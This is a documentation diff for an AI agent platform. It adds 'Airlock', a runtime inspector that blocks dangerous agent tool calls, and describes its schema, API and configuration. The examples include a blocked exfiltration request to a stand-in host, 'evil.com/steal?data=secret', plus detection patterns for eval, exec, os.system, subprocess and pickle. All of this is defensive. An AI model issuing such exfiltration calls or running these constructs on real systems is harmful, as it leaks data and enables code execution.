@@ -652,6 +652,7 @@ Professional "Mission Control" admin UI built with:
 | `/overview` | Dashboard with KPIs |
 | `/runs` | Run list with filters |
 | `/runs/[id]` | Run detail with step timeline |
+| `/threats` | Airlock security violations |
 | `/approvals` | Approval queue |
 | `/agents` | Agent registry |
 | `/agents/[id]` | Agent detail and versions |
@@ -660,7 +661,7 @@ Professional "Mission Control" admin UI built with:
 | `/analytics` | Usage charts |
 | `/audit` | Audit log viewer |
 | `/logs` | Container logs |
-| `/settings` | Configuration |
+| `/settings` | Configuration (includes Airlock settings) |
 
 ## BFF Pattern
 
@@ -701,6 +702,86 @@ export function useRun(runId: string) {
   });
 }
 ```
+
+### Security Hooks
+
+```typescript
+// List threats with filtering and polling
+export function useThreats(filters?: ThreatFilters) {
+  return useQuery({
+    queryKey: ["threats", filters],
+    queryFn: () => fetchThreats(filters),
+    refetchInterval: 5000,  // 5s polling
+  });
+}
+
+// Get single threat
+export function useThreat(threatId: string) {
+  return useQuery({
+    queryKey: ["threat", threatId],
+    queryFn: () => fetchThreat(threatId),
+  });
+}
+
+// Threats for a specific run
+export function useRunThreats(runId: string) {
+  return useQuery({
+    queryKey: ["run-threats", runId],
+    queryFn: () => fetchThreats({ run_id: runId }),
+  });
+}
+
+// Threat summary for a run
+export function useRunThreatSummary(runId: string) {
+  return useQuery({
+    queryKey: ["run-threat-summary", runId],
+    queryFn: () => fetchThreatSummary(runId),
+  });
+}
+
+// Airlock configuration
+export function useAirlockConfig() {
+  return useQuery({
+    queryKey: ["airlock-config"],
+    queryFn: fetchAirlockConfig,
+  });
+}
+
+// Update Airlock mode
+export function useUpdateAirlockConfig() {
+  const queryClient = useQueryClient();
+  return useMutation({
+    mutationFn: updateAirlockConfig,
+    onSuccess: () => {
+      queryClient.invalidateQueries({ queryKey: ["airlock-config"] });
+    },
+  });
+}
+
+// Toggle shadow/enforce mode
+export function useToggleAirlockMode() {
+  const { data: config } = useAirlockConfig();
+  const updateConfig = useUpdateAirlockConfig();
+
+  return () => {
+    const newMode = config?.mode === "shadow" ? "enforce" : "shadow";
+    updateConfig.mutate({ mode: newMode });
+  };
+}
+```
+
+### Security Components
+
+| Component | Purpose |
+|-----------|---------|
+| `ThreatTable` | Paginated threat list with filtering |
+| `ThreatFilters` | Risk level, violation type, action filters |
+| `SecurityBadge` | Color-coded risk level indicator |
+| `SecurityDetailSection` | Threat details in run detail view |
+| `ThreatCountBadge` | Threat count badge for runs |
+| `ThreatSummaryPopover` | Quick threat summary on hover |
+| `BlockedContentViewer` | View blocked payload with syntax highlighting |
+| `AirlockSettingsCard` | Toggle shadow/enforce mode in settings |
 
 ## Theme
 
@@ -864,6 +945,88 @@ CREATE TABLE tenant_quotas (
 );
 ```
 
+### threats
+Security violations detected by Airlock inspector.
+
+```sql
+CREATE TABLE threats (
+    id TEXT PRIMARY KEY,              -- thr_xxxxx
+    run_id TEXT NOT NULL REFERENCES runs(id),
+    step_id TEXT REFERENCES steps(id),
+    tool_name TEXT NOT NULL,
+    risk_score INTEGER NOT NULL CHECK (risk_score >= 0 AND risk_score <= 100),
+    risk_level TEXT NOT NULL CHECK (risk_level IN ('low', 'medium', 'high', 'critical')),
+    violation_type TEXT NOT NULL CHECK (violation_type IN (
+        'rce_pattern', 'velocity_breach', 'loop_detection',
+        'exfiltration_attempt', 'ip_address_used'
+    )),
+    violation_details TEXT NOT NULL,
+    blocked_payload JSONB,            -- The payload that was blocked
+    trigger_pattern TEXT,             -- Pattern that triggered detection
+    action TEXT NOT NULL DEFAULT 'logged' CHECK (action IN ('blocked', 'logged')),
+    shadow_mode BOOLEAN NOT NULL DEFAULT true,
+    created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
+);
+
+-- Indexes for efficient querying
+CREATE INDEX idx_threats_run_id ON threats(run_id);
+CREATE INDEX idx_threats_risk_level ON threats(risk_level);
+CREATE INDEX idx_threats_created_at ON threats(created_at DESC);
+CREATE INDEX idx_threats_critical_recent ON threats(risk_level, created_at DESC)
+    WHERE risk_level = 'critical';
+```
+
+### velocity_events
+Tool call velocity tracking for circuit breaker.
+
+```sql
+CREATE TABLE velocity_events (
+    id SERIAL PRIMARY KEY,
+    run_id TEXT NOT NULL,
+    tool_name TEXT NOT NULL,
+    tool_input_hash TEXT NOT NULL,    -- SHA256 of tool input
+    cost_cents INTEGER NOT NULL DEFAULT 0,
+    created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
+);
+
+-- Index for velocity window queries
+CREATE INDEX idx_velocity_events_run_created
+    ON velocity_events(run_id, created_at DESC);
+
+-- Cleanup function (retain 1 hour of data)
+CREATE OR REPLACE FUNCTION cleanup_velocity_events()
+RETURNS void AS $$
+BEGIN
+    DELETE FROM velocity_events
+    WHERE created_at < NOW() - INTERVAL '1 hour';
+END;
+$$ LANGUAGE plpgsql;
+```
+
+### Schema Extensions
+
+Additional columns added to existing tables:
+
+```sql
+-- runs table extension
+ALTER TABLE runs ADD COLUMN threat_count INTEGER NOT NULL DEFAULT 0;
+
+-- Trigger to auto-update threat_count
+CREATE OR REPLACE FUNCTION update_run_threat_count()
+RETURNS TRIGGER AS $$
+BEGIN
+    UPDATE runs SET threat_count = (
+        SELECT COUNT(*) FROM threats WHERE run_id = NEW.run_id
+    ) WHERE id = NEW.run_id;
+    RETURN NEW;
+END;
+$$ LANGUAGE plpgsql;
+
+CREATE TRIGGER trigger_update_threat_count
+    AFTER INSERT ON threats
+    FOR EACH ROW EXECUTE FUNCTION update_run_threat_count();
+```
+
 ---
 
 # 7. API Reference
@@ -902,6 +1065,10 @@ Authorization: ApiKey <api_key>
 | `POST` | `/v1/policies` | Create policy |
 | `GET` | `/v1/workflows` | List workflows |
 | `POST` | `/v1/workflow-runs` | Create workflow run |
+| `GET` | `/v1/security/threats` | List security threats |
+| `GET` | `/v1/security/threats/{id}` | Get threat details |
+| `GET` | `/v1/security/config` | Get Airlock configuration |
+| `PUT` | `/v1/security/config` | Update Airlock mode |
 
 ## Example: Create Run
 
@@ -950,6 +1117,133 @@ Authorization: Bearer fd_live_xxxxx
 | `POLICY_DENIED` | 403 | Tool blocked by policy |
 | `BUDGET_EXCEEDED` | 403 | Budget limits reached |
 | `UNAUTHORIZED` | 401 | Authentication failed |
+| `RATE_LIMITED` | 429 | Rate limit exceeded |
+| `INTERNAL_ERROR` | 500 | Server error |
+
+## Security Endpoints
+
+### List Threats
+
+**Request**:
+```http
+GET /v1/security/threats?risk_level=critical&action=blocked&limit=20
+Authorization: Bearer fd_live_xxxxx
+```
+
+**Query Parameters**:
+| Parameter | Type | Description |
+|-----------|------|-------------|
+| `run_id` | string | Filter by run ID |
+| `risk_level` | string | Filter by level: low, medium, high, critical |
+| `violation_type` | string | Filter by type: rce_pattern, velocity_breach, etc. |
+| `action` | string | Filter by action: blocked, logged |
+| `limit` | integer | Max results (default: 50) |
+| `offset` | integer | Pagination offset |
+
+**Response** (200):
+```json
+{
+  "threats": [
+    {
+      "id": "thr_01HGXK...",
+      "run_id": "run_01HGXK...",
+      "step_id": "stp_01HGXK...",
+      "tool_name": "write_file",
+      "risk_score": 90,
+      "risk_level": "critical",
+      "violation_type": "rce_pattern",
+      "violation_details": "Dangerous pattern detected: eval() call",
+      "blocked_payload": {"content": "eval(user_input)"},
+      "trigger_pattern": "eval\\s*\\(",
+      "action": "blocked",
+      "shadow_mode": false,
+      "created_at": "2024-01-15T10:30:00Z"
+    }
+  ],
+  "total": 1,
+  "limit": 20,
+  "offset": 0
+}
+```
+
+### Get Threat Details
+
+**Request**:
+```http
+GET /v1/security/threats/thr_01HGXK...
+Authorization: Bearer fd_live_xxxxx
+```
+
+**Response** (200):
+```json
+{
+  "id": "thr_01HGXK...",
+  "run_id": "run_01HGXK...",
+  "step_id": "stp_01HGXK...",
+  "tool_name": "http_get",
+  "risk_score": 80,
+  "risk_level": "critical",
+  "violation_type": "exfiltration_attempt",
+  "violation_details": "Unauthorized destination: evil.com not in allowlist",
+  "blocked_payload": {"url": "https://evil.com/steal?data=secret"},
+  "trigger_pattern": "domain_not_whitelisted",
+  "action": "blocked",
+  "shadow_mode": false,
+  "created_at": "2024-01-15T10:30:00Z"
+}
+```
+
+### Get Airlock Configuration
+
+**Request**:
+```http
+GET /v1/security/config
+Authorization: Bearer fd_live_xxxxx
+```
+
+**Response** (200):
+```json
+{
+  "mode": "shadow",
+  "rce": {
+    "enabled": true
+  },
+  "velocity": {
+    "enabled": true,
+    "max_cost_cents": 100,
+    "window_seconds": 10,
+    "loop_threshold": 3
+  },
+  "exfiltration": {
+    "enabled": true,
+    "target_tools": ["http_get", "http_post"],
+    "allowed_domains": ["api.github.com"],
+    "block_ip_addresses": true
+  }
+}
+```
+
+### Update Airlock Mode
+
+**Request**:
+```http
+PUT /v1/security/config
+Content-Type: application/json
+Authorization: Bearer fd_live_xxxxx
+
+{
+  "mode": "enforce"
+}
+```
+
+**Response** (200):
+```json
+{
+  "mode": "enforce",
+  "previous_mode": "shadow",
+  "updated_at": "2024-01-15T10:30:00Z"
+}
+```
 
 ---
 
@@ -1038,6 +1332,133 @@ Sensitive data is automatically redacted:
 ### LLM02 (Insecure Output Handling)
 - Output validation before tool execution
 - Pattern detection for dangerous constructs
+
+## Airlock RASP (Runtime Application Self-Protection)
+
+Airlock is a multi-layer runtime security system that inspects every tool call before execution. It operates as a "virtual security guard" between the LLM and tool execution.
+
+### Operating Modes
+
+| Mode | Behavior | Use Case |
+|------|----------|----------|
+| **Shadow** (default) | Log violations but allow execution | Safe rollout, monitoring |
+| **Enforce** | Block violations immediately | Production protection |
+
+### Three Inspection Layers
+
+```
+Tool Call → [Layer 1: RCE Detection] → [Layer 2: Velocity Tracker] → [Layer 3: Exfiltration Shield] → Execute
+                    ↓                          ↓                              ↓
+               Block if pattern           Block if limit              Block if unauthorized
+               matches dangerous           exceeded                    destination
+               code patterns
+```
+
+#### Layer 1: Anti-RCE Pattern Detection
+Detects dangerous code patterns in tool inputs:
+- `eval()`, `exec()`, `compile()` calls
+- `os.system()`, `subprocess.run()` shell execution
+- Dynamic imports (`__import__`, `importlib`)
+- Pickle deserialization (`pickle.loads`)
+- Code objects (`code_type`, `types.CodeType`)
+
+**Risk Score**: 90 (Critical)
+
+#### Layer 2: Financial Circuit Breaker (Velocity Tracker)
+Prevents runaway costs and infinite loops:
+- **Spending velocity**: Max $1.00 per 10 seconds (configurable)
+- **Loop detection**: Same tool+args called 3+ times triggers block
+
+**Risk Scores**:
+- Velocity breach: 85 (Critical)
+- Loop detection: 75 (High)
+
+#### Layer 3: Data Exfiltration Shield
+Prevents unauthorized data transfer:
+- Domain whitelist enforcement
+- Raw IP address blocking
+- URL pattern validation
+
+**Risk Scores**:
+- Exfiltration attempt: 80 (Critical)
+- IP address used: 70 (High)
+
+### Risk Scoring System
+
+| Level | Score Range | Color | Action |
+|-------|-------------|-------|--------|
+| **Low** | 0-39 | Green | Log only |
+| **Medium** | 40-59 | Yellow | Log + alert |
+| **High** | 60-79 | Orange | Block in enforce mode |
+| **Critical** | 80-100 | Red | Always block in enforce mode |
+
+### Violation Types
+
+| Type | Description | Default Risk |
+|------|-------------|--------------|
+| `rce_pattern` | Dangerous code pattern detected | 90 (Critical) |
+| `velocity_breach` | Spending limit exceeded | 85 (Critical) |
+| `loop_detection` | Infinite loop detected | 75 (High) |
+| `exfiltration_attempt` | Unauthorized destination | 80 (Critical) |
+| `ip_address_used` | Raw IP instead of domain | 70 (High) |
+
+### Configuration
+
+```yaml
+# Airlock configuration
+airlock:
+  mode: shadow  # shadow (default) or enforce
+
+  rce:
+    enabled: true
+    # Patterns are built-in and cannot be customized
+
+  velocity:
+    enabled: true
+    max_cost_cents: 100      # $1.00 per window
+    window_seconds: 10       # 10 second sliding window
+    loop_threshold: 3        # Block after 3 identical calls
+
+  exfiltration:
+    enabled: true
+    target_tools:            # Tools to inspect
+      - http_get
+      - http_post
+      - fetch_url
+    allowed_domains:         # Whitelist (empty = block all external)
+      - api.github.com
+      - api.anthropic.com
+    block_ip_addresses: true # Block raw IPs
+```
+
+### Airlock API
+
+```http
+# Get current configuration
+GET /v1/security/config
+
+# Update mode (shadow/enforce)
+PUT /v1/security/config
+Content-Type: application/json
+
+{
+  "mode": "enforce"
+}
+
+# List detected threats
+GET /v1/security/threats?risk_level=critical&limit=50
+
+# Get specific threat details
+GET /v1/security/threats/{threat_id}
+```
+
+### Integration with Runs
+
+When Airlock detects a violation:
+1. Threat record created with full context
+2. Run's `threat_count` incremented
+3. If enforce mode: tool call blocked, run may be terminated
+4. If shadow mode: tool call proceeds, violation logged
 
 ---
 
